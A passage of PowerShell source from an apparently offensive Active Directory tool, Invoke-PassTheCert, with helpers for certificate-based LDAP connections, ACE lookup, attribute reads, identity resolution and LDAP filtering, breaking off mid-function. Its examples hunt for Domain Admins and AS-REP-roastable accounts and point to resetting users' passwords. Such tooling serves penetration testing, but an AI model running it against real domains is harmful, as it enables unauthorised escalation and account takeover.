        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the identity string from which to gather the Distinguished Name")]
        [System.String]$IdentityString,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the domain of the provided identity string")]
        [System.String]$IdentityDomain
    )
    
    # If the input identity string is already a distinguished name, do nothing and return the input.
    if ($TypeOfIdentityString -eq 'distinguishedName') { 
        return $IdentityString; 
    }

    Write-Verbose "[*] Retrieving The Distinguished Name Of Identity String '$IdentityString' In Domain '$IdentityDomain'..."

    $TypeOfIdentityString = _Helper-GetTypeOfIdentityString -IdentityString $IdentityString
    $SearchBase = _Helper-GetDomainDNFromDomainName $IdentityDomain

    if ($TypeOfIdentityString -eq 'SID') {
        return (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope 'Subtree' -SIDFilter $IdentityString).distinguishedName
    }
    elseif ($TypeOfIdentityString -eq 'GUID') {
        return (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope 'Subtree' -GUIDFilter $IdentityString).distinguishedName
    }
    elseif ($TypeOfIdentityString -eq 'sAMAccountName') {
        return (_Filter -LdapConnection $LdapConnection -SearchBase $SearchBase -SearchScope 'Subtree' -LDAPFilter "(sAMAccountName=$IdentityString)").distinguishedName
    }
}


function _Helper-GetReadableValueOfBytes {
    
    <#
    
        .SYNOPSIS

            Returns the human-readable form of the given bytes array

        .PARAMETER Type

            [System.String]

            The type of the array bytes (among 'objectSid', 'nTSecurityDescriptor', 'objectGuid')

        .PARAMETER ArrayOfBytes

            [byte[]]

            The array of bytes containing the value of the specified type

        .EXAMPLE

            _Helper-GetReadableValueOfBytes -Type 'objectSid' -ArrayOfBytes $Bytes

            Returns the string representation of the given `objectSid` bytes.

        .EXAMPLE

            _Helper-GetReadableValueOfBytes -Type 'nTSecurityDescriptor' -ArrayOfBytes $Bytes

            Returns the object representation of the given `nTSecurityDescriptor` bytes.

        .EXAMPLE

            _Helper-GetReadableValueOfBytes -Type 'objectGuid' -ArrayOfBytes $Bytes

            Returns the string representation of the given `objectGuid` bytes.

        .OUTPUTS
            
            The human-readable form of the given bytes array

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.security.principal.securityidentifier.-ctor

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.security.accesscontrol.rawsecuritydescriptor.-ctor

        .LINK 
        
            https://learn.microsoft.com/en-us/windows/win32/api/guiddef/ns-guiddef-guid

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the type of the array bytes (among 'objectSid', 'nTSecurityDescriptor', 'objectGuid')")]
        [ValidateSet('objectSid', 'nTSecurityDescriptor', 'objectGuid')]
        [System.String]$Type,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the array of bytes containing the value of the specified type")]
        [byte[]]$ArrayOfBytes
    )

    Write-Verbose "[*] Converting Array Of Bytes Of Type '$Type' Into A Human-Readable Form..."

    if ($Type -eq "objectSid") {
        $Result = New-Object System.Security.Principal.SecurityIdentifier($ArrayOfBytes, 0)
        $Result = $Result.Value
    } elseif ($Type -eq "nTSecurityDescriptor") {
        $Result = New-Object System.Security.AccessControl.RawSecurityDescriptor($ArrayOfBytes, 0)
    } elseif ($Type -eq "objectGuid") {
        # https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L8176-L8179
        # https://unlockpowershell.wordpress.com/2010/07/01/powershell-search-ad-for-a-guid/
        # Byte order is 4th, 3rd, 2nd, 1st, 6th, 5th, 8th, 7th, 9th, 10th, ...
        $AOB = $ArrayOfBytes
        $ArrayOfBytes = @(
            $AOB[3], $AOB[2], $AOB[1], $AOB[0],
            $AOB[5], $AOB[4],
            $AOB[7], $AOB[6]
        ) + $AOB[8..15]
        $Result = [Guid]::New([byte[]]$ArrayOfBytes)
    }

    Write-Verbose "[+] Successfully Converted Array Of Bytes Of Type '$Type' Into A Human-Readable Form !"

    return $Result

}

function _GetAttributeOfObject {
    
    <#

        .SYNOPSIS

            Returns the Attribute the specified LDAP object

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER ObjectDN

            [System.String] 
            
            The object's Distinguished Name against which the LDAP lookup must be performed.

        .PARAMETER Attribute

            [System.String] 
            
            The attribute from which the value must be extracted.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN 'CN=Administrator,CN=Users,DC=X' -Attribute 'sAMAccountName'

            Returns `Administrator` (i.e. the content of the attribute `CN=Administrator,CN=Users,DC=X`:`sAMAccountName` attribute)

        .EXAMPLE

            _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN 'DC=X' -Attribute 'ms-DS-MachineAccountQuota'

            Returns the domain's MAQ (i.e. the content of the `DC=X`:`ms-DS-MachineAccountQuota` attribute), 10 by default

        .OUTPUTS

            [System.String] 
            
            The Attribute the specified LDAP object

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,
        
        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the identity of the targeted object from which to retrieve an attribute's value")]
        [System.String]$ObjectDN,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the attribute of the targeted object")]
        [System.String]$Attribute
    )
    
    Write-Verbose "[*] Retrieving Attibute '$Attribute' Of Object '$ObjectDN'..."
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    $Result = '';

    $SearchResponse = $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.SearchRequest(
            $ObjectDN, 
            '(objectClass=*)', 
            [System.DirectoryServices.SearchScope]::Base,
            $Attribute
        ))
    )

    if ($SearchResponse.Entries.Count -eq 0) {
        Write-Host "[!] Object '$ObjectDN' Not Found ! Returning `$null..."
        return $null
    } else {
        # Dealing with edge-cases (i.e. attribute containing bytes)
        if ($Attribute -in @("objectSid", "nTSecurityDescriptor", "objectGuid")) {
            $Result = _Helper-GetReadableValueOfBytes -Type $Attribute -ArrayOfBytes $SearchResponse.Entries[0].Attributes[$Attribute][0]
        } else {
            $Result = $SearchResponse.Entries[0].Attributes[$Attribute][0]
        }
        Write-Verbose "[+] Successfully Retrieved '$Result' From '$ObjectDN':'$Attribute' Attribute !"
        return $Result
    }
}


function _GetIndexOfInboundACEFromIdentityToTarget {
    
    <#

        .SYNOPSIS

            Returns the Index (starting at 0) of an ACE provided to a source principal towards a targeted object.
            
            - Returns -1 if the specified ACE is not found into the target object's inbound ACEs.
            - In such a case, it means the ACE wasn't provided to the specified source principal towards the specified targeted object.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER IdentityDN

            [System.String]
            
            The source principal's identity of the ACE to search (i.e. principal granted / denied with the ACE)

        .PARAMETER AceQualifier

            [System.String] 
            
            The Qualifier of the ACE to search (i.e. `AccessAllowed`, `AccessDenied`, `SystemAudit`, or `SystemAlarm`)

        .PARAMETER AccessMaskNames

            [System.String] 
            
            The Access Mask Name(s) (comma-separated, if multiple) of the ACE to search

        .PARAMETER AccessRightName

            [System.String] 
            
            The Access Right Name (i.e. ObjectAceType) of the ACE to search

        .PARAMETER TargetDN

            [System.String] 
            
            The destination object's identity of the ACE to search (i.e. targeted object against which the ACE applies)

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _GetIndexOfInboundACEFromIdentityToTarget -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'GenericAll' -TargetDN 'CN=Smart SC. CARDY,CN=Users,DC=X'

            Returns the Index of the ALLOWED `GenericAll` ACE provided to principal `John JD. DOE` against the targeted object `Smart SC. CARDY` (-1 if not found)

        .EXAMPLE

            _GetIndexOfInboundACEFromIdentityToTarget -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -AceQualifier 'AccessDenied' -AccessMaskNames 'GenericAll' -TargetDN 'CN=Smart SC. CARDY,CN=Users,DC=X'

            Returns the Index of the DENIED `GenericAll` ACE provided to principal `John JD. DOE` against the targeted object `Smart SC. CARDY` (-1 if not found)

        .EXAMPLE

            _GetIndexOfInboundACEFromIdentityToTarget -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightName 'User-Change-Password' -TargetDN 'CN=Smart SC. CARDY,CN=Users,DC=X'

            Returns the Index of the ALLOWED `User-Change-Password` ACE provided to principal `John JD. DOE` with `AccessAllowed` against the targeted object `Smart SC. CARDY` (-1 if not found)

        .EXAMPLE

            _GetIndexOfInboundACEFromIdentityToTarget -LdapConnection $LdapConnection -IdentityDN 'CN=John JD. DOE,CN=Users,DC=X' -AceQualifier 'AccessAllowed' -AccessMaskNames 'ExtendedRight' -AccessRightGUID 'ab721a53-1e2f-11d0-9819-00aa0040529b' -TargetDN 'CN=Smart SC. CARDY,CN=Users,DC=X'

            Returns the Index of the ALLOWED `User-Change-Password` (whose GUID is `ab721a53-1e2f-11d0-9819-00aa0040529b`) ACE provided to principal `John JD. DOE` with `AccessAllowed` against the targeted object `Smart SC. CARDY` (-1 if not found)

        .OUTPUTS

            [System.Int32]
            
            The Index (starting at 0) of an ACE provided to a source principal towards a targeted object (-1 if not found)

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$true, HelpMessage="Enter the source principal's identity of the ACE to search (i.e. principal granted / denied with the ACE)")]
        [System.String]$IdentityDN,

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the Qualifier of the ACE to search (i.e. 'AccessAllowed', 'AccessDenied', 'SystemAudit', or 'SystemAlarm')")]
        [ValidateSet('AccessAllowed', 'AccessDenied', 'SystemAudit', 'SystemAlarm')]
        [System.String]$AceQualifier,

        [Parameter(Position=3, Mandatory=$true, HelpMessage="Enter the Access Mask Name(s) (comma-separated, if multiple) of the ACE to search (among 'CreateChild', 'DeleteChild', 'ListChildren', 'Self', 'ReadProperty', 'WriteProperty', 'DeleteTree', 'ListObject', 'ExtendedRight', 'Delete', 'ReadControl', 'GenericExecute', 'GenericWrite', 'GenericRead', 'WriteDacl', 'WriteOwner', 'GenericAll', 'Synchronize', and 'AccessSystemSecurity')")]
        [System.String]$AccessMaskNames,

        [Parameter(Position=4, Mandatory=$false, HelpMessage="Enter the Access Right Name (i.e. ObjectAceType) of the ACE to search (refer to '[MS-ADTS]: 5.1.3.2.1 Control Access Rights', and 'PrincipalTo*.txt')")]
        [PSDefaultValue(Help="Empty string to handle ACEs without ObjectAceType (i.e. with access mask(s) only, such as 'GenericAll')")]
        [System.String]$AccessRightName = '',

        [Parameter(Position=5, Mandatory=$false, HelpMessage="Enter the Access Right GUID (i.e. ObjectAceType) of the ACE to search (you may refer to '[MS-ADTS]: 5.1.3.2.1 Control Access Rights', and 'PrincipalTo*.txt'). (... ¿ do you really need to specify it, as you may conveniently use -AccessRightName instead ? ...)")]
        [PSDefaultValue(Help="Empty string by default if not specified")]
        [System.String]$AccessRightGUID = '',

        [Parameter(Position=6, Mandatory=$true, HelpMessage="Enter the destination object's identity of the ACE to search (i.e. targeted object against which the ACE applies)")]
        [System.String]$TargetDN
    )

    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    $AccessMaskValue = _Helper-GetValueOfACEAccessMaskNames -AccessMaskNames $AccessMaskNames
    # If the user provided its own AccessRightGUID, we won't look for a match with the name (i.e. the following condition becomes false, hence not executed)
    if (-not $AccessRightGUID) { $AccessRightGUID = _Helper-GetGUIDOfACEAccessRightName -AccessRightName $AccessRightName }
    $IdentitySID = _GetAttributeOfObject -LdapConnection $LdapConnection -ObjectDN $IdentityDN -Attribute 'objectSid'

    # Some ACEs doesn't have 'ObjectAceType' attribute (e.g. 'GenericAll'), hence being set to None.
    if ($AccessRightName -eq $null) {
        $ACEString = "[AceQualifier='$AceQualifier', AccessMasks='$AccessMaskNames', ObjectAceType=NULL]"
    } else {
        $ACEString = "[AceQualifier='$AceQualifier', AccessMasks='$AccessMaskNames', ObjectAceType='$AccessRightName']"
    }

    Write-Verbose "[*] Retrieving Index Of Inbound ACE $ACEString Provided To Principal '$IdentityDN' Towards '$TargetDN'..."

    $i = 0
    foreach ($ACE in _GetInboundACEs -LdapConnection $LdapConnection -ObjectDN $TargetDN) {
        # Some ACEs doesn't have 'ObjectAceType' attribute (e.g. 'GenericAll'), hence being set to None.
        if ($AccessRightGUID -eq [Guid]::Empty) {
            if ($ACE.SecurityIdentifier -eq $IdentitySID -and $ACE.AceQualifier -eq $AceQualifier -and $ACE.AccessMaskNames -eq $AccessMaskNames -and $ACE.ObjectAceType -eq $null) {
                Write-Verbose "[+] Successfully Retrieved Index '$i' Of Inbound ACE $ACEString Provided To Principal '$IdentityDN' Towards '$TargetDN' !"
                return $i
            }
        } else {
            if ($ACE.SecurityIdentifier -eq $IdentitySID -and $ACE.AceQualifier -eq $AceQualifier -and $ACE.AccessMaskNames -eq $AccessMaskNames -and $ACE.ObjectAceType -eq $AccessRightGUID) {
                Write-Verbose "[+] Successfully Retrieved Index '$i' Of Inbound ACE $ACEString Provided To Principal '$IdentityDN' Towards '$TargetDN' !"
                return $i
            }
        }
        $i++
    }
    
    Write-Verbose "[!] Could Find Inbound ACE $ACEString Provided To Principal '$IdentityDN' Towards '$TargetDN' ! Returning -1..."
    return -1;
}






# ===========================================================
# ===    Invoke-PassTheCert Building Blocks Functions     ===
# ===========================================================


function _LDAPExtendedOperationWhoami {
    
    <#

        .SYNOPSIS

            Returns the Response of the "Who am I" LDAP Extended Operation (whoamiOID OBJECT IDENTIFIER ::= "1.3.6.1.4.1.4203.1.11.3") using an LDAP Connection Instance.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _LDAPExtendedOperationWhoami -LdapConnection $LdapConnection

            Returns the identity of the client associated with the LDAP Connection Instance

        .OUTPUTS

            [System.String] 
            
            The Response of the "Who am I" LDAP Extended Operation (whoamiOID OBJECT IDENTIFIER ::= "1.3.6.1.4.1.4203.1.11.3") using an LDAP Connection Instance.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK

            https://datatracker.ietf.org/doc/html/rfc4532
        
        .LINK

            https://ldap.com/ldapv3-wire-protocol-reference-extended/
        
        .LINK

            https://docs.oracle.com/cd/E19476-01/821-0510/def-who-am-i-extended-operation.html

        .LINK

            https://www.openldap.org/foundation/oid-delegate.txt

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection
    )
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    $Response = $LdapConnection.SendRequest(
        (New-Object System.DirectoryServices.Protocols.ExtendedRequest(
            "1.3.6.1.4.1.4203.1.11.3"
        ))
    )
    
    if ($Response.ResponseValue) {
        $Result = [System.Text.Encoding]::UTF8.GetString($Response.ResponseValue)
        Write-Host "[+] Authenticated As: '$Result'"
        return
    }
}


function _LDAPExtendedOperationPasswordModify {
    
    <#

        .SYNOPSIS

            Executes the "Password Modify" LDAP Extended Operation (passwdModifyOID OBJECT IDENTIFIER ::= "1.3.6.1.4.1.4203.1.11.1") using an LDAP Connection Instance.
            As a result, updates the client's password associated with the specified LDAP Connection Instance.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER OldPassword

            [System.String] 
            
            The old password of of the client associated with the LDAP Connection Instance (if applicable, i.e. if the LDAP/S Server's policy requires it) (Optional).

        .PARAMETER NewPassword

            [System.String] 
            
            The new password to set.

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _LDAPExtendedOperationPasswordModify -LdapConnection $LdapConnection -NewPassword 'NewP@ssw0rd123!'

            Updates the password of the client associated with the LDAP Connection Instance to `NewP@ssw0rd123!`, without specifying the Old Password (for permissive LDAP policies).

        .EXAMPLE

            _LDAPExtendedOperationPasswordModify -LdapConnection $LdapConnection -OldPassword 'Password123!' -NewPassword 'NewP@ssw0rd123!'

            Updates the password of the client associated with the LDAP Connection Instance to `NewP@ssw0rd123!`, specifying the Old Password (for restrictive LDAP policies).

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection

        .LINK

            https://datatracker.ietf.org/doc/html/rfc3062

        .LINK

            https://ldap.com/ldapv3-wire-protocol-reference-extended/

        .LINK
        
            https://docs.oracle.com/cd/E19476-01/821-0510/def-password-modify-extended-operation.html

        .LINK

            https://www.openldap.org/foundation/oid-delegate.txt

    #>

    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the old password of the certificate-authenticated user (if applicable, i.e. i.e. if the LDAP/S Server's policy requires it)")]
        [PSDefaultValue(Help="Defaults to empty string if the old password is NOT required by the LDAP/S Server's policy")]
        [System.String]$OldPassword = '',

        [Parameter(Position=2, Mandatory=$true, HelpMessage="Enter the new password to set for the certificate-authenticated user")]
        [System.String]$NewPassword
    )
    
    _Helper-ShowParametersOfFunction -FunctionName $MyInvocation.MyCommand -PSBoundParameters $PSBoundParameters

    # TODO: Implement _LDAPExtendedOperationPasswordModify Function Using The Provided RELATED LINKS References In: Get-Help _LDAPExtendedOperationPasswordModify -Full

    #$LdapConnection.SendRequest(
    #    (New-Object System.DirectoryServices.Protocols.ExtendedRequest(
    #        "1.3.6.1.4.1.4203.1.11.1",
    #        $RequestValue
    #    ))
    #)

    Write-Host "[!] 'Password Modify' LDAP Extended Operation (RFC3062) Not Implemented Yet :("
    Write-Host "[*] [Alternative] Invoke-PassTheCert -Action 'UpdatePasswordOfIdentity' -LdapConnection"'$LdapConnection'"-IdentityDN '$(_GetSubjectDNFromLdapConnection -LdapConnection $LdapConnection)' -NewPassword $NewPassword"
    return
}


function _Filter {
    
    <#

        .SYNOPSIS

            Returns a list of [PSCustomObject] object(s) found by the LDAP query.

            - Suffixing the command with `|fl` pipe allows to print the multi-valued attributes conveniently, i.e. separated by new lines (e.g. `serviceprincipalename`, `memberof`) (no more "...").
            - Returns $null if no entry is found.

        .PARAMETER LdapConnection

            [System.DirectoryServices.Protocols.LdapConnection] 
            
            The established LDAP Connection Instance.

        .PARAMETER SearchBase

            [System.String] 
            
            The Distinguished Name of the Seach Base of the LDAP lookup (e.g. 'DC=X')

            - If not specified, defaults to the LDAP/S Server's domain.

        .PARAMETER SearchScope

            [System.String] 
            
            The Seach Base of the LDAP lookup ('Base', 'OneLevel', or 'Subtree').
            
            - If not specified, defaults to 'Subtree', i.e. search recursively from the given Search Base)

        .PARAMETER Properties

            [System.String] 
            
            The Properties to be returned (e.g. 'sAMAccountName,DistinguishedName') (default: '*', i.e. return all properties of the returned object(s))

        .PARAMETER LDAPFilter

            [System.String] 
            
            The LDAP Filter of the LDAP lookup (e.g. '(objectClass=person)')

        .PARAMETER UACFilter

            [System.String] 
            
            The UAC Flag(s) (comma-separated, if multiple) or Value to be filtered from the LDAP lookup (e.g. 'ACCOUNTDISABLE,NORMAL_ACCOUNT', or "$(0x0200+0x0002)")

        .PARAMETER DNFilter 
        
            [System.String] 
            
            The DN to be filtered from the LDAP lookup (e.g. `CN=Administrator,CN=Users,DC=X`)

        .PARAMETER GUIDFilter

            [System.String] 
            
            The GUID to be filtered from the LDAP lookup (e.g. `ad20f953-2164-2a4a-ace6-7489bb9d7bd3`)

        .PARAMETER SIDFilter

            [System.String] 
            
            The SID to be filtered from the LDAP lookup (e.g. `S-1-5-21-2539905369-2457893589-779357875-500`)

        .EXAMPLE

            $LdapConnection = Invoke-PassTheCert-GetLDAPConnectionInstance -Server '<IP>' -Port <PORT> -Certificate '<FILE_OR_BASE64_CERTIFICATE>' [-CertificatePassword '<CERTIFICATE_PASSWORD>']

            Retrieves an LDAP Connection Instance to the LDAP/S Server `<IP>:<PORT>` (default port: 636), authenticating using a passwordless/password-protected certificate file/base64-encoded.

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -LDAPFilter '(&(objectCategory=Computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))'

            Returns all the Domain Controllers in the `X` domain

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase $null -SearchScope Base -Properties * -LDAPFilter '(objectClass=*)'

            Returns the RootDSE (Root Directory Server Agent Service Entry), i.e. the LDAP Server's information about itself, with NO base (hence NULL)

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -LDAPFilter '(&(objectClass=*)(memberOf=CN=Domain Admins,CN=Users,DC=X))'

            Returns all the members of the `Domain Admins` group (4r3n't y4 lO0k1n' 2 Pr1v3$C ?!)

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Base -Properties * -LDAPFilter '(objectClass=*)'

            Returns the object `DC=X` itself (using `-SearchScope Base`)

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -LDAPFilter '(objectClass=domain)' |Select-Object lockoutobservationwindow,lockoutDuration,lockoutThreshold,maxPwdAge,minPwdAge,minPwdLength,pwdHistoryLength,pwdProperties,msDS-PasswordReversibleEncryptionEnabled

            Returns all the objects of class `domain` in the `X` domain, and extract the attributes related to password policy

            - The Provided 'DefaultPassPol2022DC.txt' May Be Checked To Get The Default Password Policy In Windows Server 2022 DC.

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -LDAPFilter '(objectClass=domain)' |Select-Object ms-DS-MachineAccountQuota

            Returns all the objects of class `domain` in the `X` domain, and extract the MAQ attribute

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties 'distinguishedName,name' -LDAPFilter '(&(objectCategory=organizationalUnit))'

            Returns all Organizational Units, and extract the `distinguishedName` and `name` properties

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase "OU=Unity,DC=X" -SearchScope Subtree -Properties 'distinguishedName' -LDAPFilter '(objectClass=*)'

            Returns all members of the Organizational Unit `Unity`, recursive lookup (using `-SearchScope Subtree`)

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase "OU=Unity,DC=X" -SearchScope OneLevel -Properties 'distinguishedName' -LDAPFilter '(objectClass=*)'

            Returns all members of the Organizational Unit `Unity`, no recursive lookup (using `-SearchScope OneLevel`)

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -UACFilter $(0x400000)

            Returns all accounts with `DONT_REQ_PREAUTH` UAC Flag (4r3n't y4 lO0k1n' 4 A$R3PR0a$t4b13s ?!)

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -UACFilter 'DONT_REQ_PREAUTH'

            Returns all accounts with `DONT_REQ_PREAUTH` UAC Flag (4r3n't y4 lO0k1n' 4 A$R3PR0a$t4b13s ?!)

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties 'sAMAccountName' -UACFilter "$(0x0200+0x0002)"

            Returns all accounts with `ACCOUNTDISABLE` and `NORMAL_ACCOUNT` UAC Flags

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties 'sAMAccountName' -UACFilter 'ACCOUNTDISABLE,NORMAL_ACCOUNT'

            Returns all accounts with `ACCOUNTDISABLE` and `NORMAL_ACCOUNT` UAC Flags

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -DNFilter 'CN=DC02,OU=Domain Controllers,DC=X'

            Returns the object with the Distinguished Name `CN=DC02,OU=Domain Controllers,DC=X`

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -SIDFilter 'S-1-5-21-2539905369-2457893589-779357875-500'

            Returns the object with SID `S-1-5-21-2539905369-2457893589-779357875-500`

        .EXAMPLE

            _Filter -LdapConnection $LdapConnection -SearchBase 'DC=X' -SearchScope Subtree -Properties * -GUIDFilter 'ad20f953-2164-2a4a-ace6-7489bb9d7bd3'

            Returns the object with GUID `ad20f953-2164-2a4a-ace6-7489bb9d7bd3`

        .OUTPUTS

            [PSCustomObject[]]

            List of [PSCustomObject] object(s) found by the LDAP query.

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.ldapconnection
        
        .LINK 
        
            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.searchrequest

        .LINK 

            https://ldapwiki.com/wiki/Wiki.jsp?page=RootDSE

        .LINK 

            https://stackoverflow.com/questions/19696753/how-does-one-connect-to-the-rootdse-and-or-retrieve-highestcommittedusn-with-sys

        .LINK 
        
            https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/b645c125-a7da-4097-84a1-2fa7cea07714#gt_29942b69-e0ed-4fe7-bbbf-1a6a3f9eeeb6 (rootDSE)

        .LINK

            https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1#L8176-L8179

        .LINK 

            https://unlockpowershell.wordpress.com/2010/07/01/powershell-search-ad-for-a-guid/

        .LINK

            https://datatracker.ietf.org/doc/html/rfc4515 (LDAP: String Representation of Search Filters)

        .LINK 

            https://datatracker.ietf.org/doc/html/rfc2696 (LDAP Control Extension for Simple Paged Results Manipulation)

        .LINK 
        
            https://www.openldap.org/doc/admin26/limits.html

        .LINK

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.searchrequest.sizelimit

        .LINK 

            https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.protocols.pageresultrequestcontrol

    #>
    
    [CmdletBinding()]
    param(
        [Parameter(Position=0, Mandatory=$true, HelpMessage="Enter the LDAP Connection Instance")]
        [ValidateNotNullorEmpty()]
        [System.DirectoryServices.Protocols.LdapConnection]$LdapConnection,

        [Parameter(Position=1, Mandatory=$false, HelpMessage="Enter the Distinguished Name of the Seach Base of the LDAP lookup")]
        [PSDefaultValue(Help="Defaulting to an empty string allows to differentiate from an undefined value (hence empty string here), and `$null (specifically used to look for the RootDSE)")]
        # Not setting its type [System.String] allows to differentiate '' and $null
        # If we use [System.String]$SearchBase, then we won't be allowed to differentiate when the variable is set to '', or $null => It will always be considered as '', even if unspecified from the command line.
        # Being able to tell when this parameter is $null (and NOT '') can be handy to differentiate, for instance, if the user specifically request the RootDSE (setting the SearchBase to $null).
        $SearchBase = '',
        
        [Parameter(Position=2, Mandatory=$false, HelpMessage="Enter the Seach Base of the LDAP lookup (accepted values: 'Base', 'OneLevel', 'Subtree')")]
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
